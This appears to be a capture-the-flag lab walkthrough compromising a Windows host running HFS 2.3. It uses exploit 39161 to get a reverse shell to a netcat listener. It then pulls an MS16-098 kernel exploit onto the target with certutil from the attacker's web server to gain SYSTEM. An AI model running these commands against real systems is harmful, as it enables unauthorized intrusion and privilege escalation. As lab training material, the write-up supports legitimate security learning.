# IP Address: 10.10.10.8

# Enumeration

```
┌──(code㉿kali)-[~]
└─$ nmapAutomator.sh -H 10.10.10.8 -t all

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

The target is running HttpFileServer (HFS) version 2.3. This software is vulnerable to remote code execution. Exploit code is available here: https://www.exploit-db.com/exploits/39161

# Exploitation

Download the exploit code and run against the target to get a reverse shell. Note: for the exploit, we need to copy netcat to our local web server and edit the local IP address and port values in the exploit code.

```
┌──(code㉿kali)-[~]
└─$ searchsploit hfs
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution ( | windows/remote/39161.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(code㉿kali)-[~]
└─$ searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/code/39161.py



┌──(code㉿kali)-[~]
└─$ sudo cp /usr/share/windows-binaries/nc.exe /var/www/html
[sudo] password for code: 

┌──(code㉿kali)-[~]
└─$ sudo service apache2 start
```

Original exploit code:
```
┌──(code㉿kali)-[~]
└─$ grep ip_addr -A 4 39161.py 
        ip_addr = "192.168.44.128" #local IP address
        local_port = "443" # Local Port number

```

Edited code:
```
┌──(code㉿kali)-[~]
└─$ grep ip_addr -A 4 39161.py                                                       
        ip_addr = "10.10.14.7" #local IP address
		local_port = "443" # Local Port number
		
```

Locally, in terminal window 1:
```
┌──(code㉿kali)-[~]
└─$ python 39161.py 10.10.10.8 80
```

Locally, in terminal window 2:
```
┌──(code㉿kali)-[~]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.8] 49170
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>

```

user.txt

![[Pasted image 20211114204627.png]]

# Privilege Escalation
Copy the output of systeminfo locally for analysis with windows-exploit-suggester.

```
┌──(code㉿kali)-[~/tools]
└─$ python2.7 windows-exploit-suggester.py --database 2021-11-15-mssb.xls --systeminfo systeminfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)

```

Searching google for MS16-098, find https://github.com/sensepost/ms16-098.git
Clone it and copy it to our local web server. 

```
┌──(code㉿kali)-[~]                                                                                                                                                                                                                          
└─$ git clone https://github.com/sensepost/ms16-098.git                                                                                                                                                                                      
Cloning into 'ms16-098'...                                                                                                                                                                                                                   
remote: Enumerating objects: 14, done.
remote: Total 14 (delta 0), reused 0 (delta 0), pack-reused 14
Receiving objects: 100% (14/14), 177.84 KiB | 1.22 MiB/s, done.                                                                                                                                                                              
Resolving deltas: 100% (2/2), done.                                                                                                                                                                                                          

┌──(code㉿kali)-[~]
└─$ sudo cp ms16-098/                                                                                                                                                                                                                        
bfill.exe  .git/      main.c     README.md  
┌──(code㉿kali)-[~]
└─$ sudo cp ms16-098/bfill.exe /var/www/html/sploit.exe
```

Pull it down on the target using certutil. Run it.

```
C:\Users\kostas\Desktop>certutil -urlcache -split -f "http://10.10.14.14/sploit.exe
certutil -urlcache -split -f "http://10.10.14.14/sploit.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.

C:\Users\kostas\Desktop>sploit.exe
sploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

```

# Proof
root.txt

![[Pasted image 20211115195150.png]]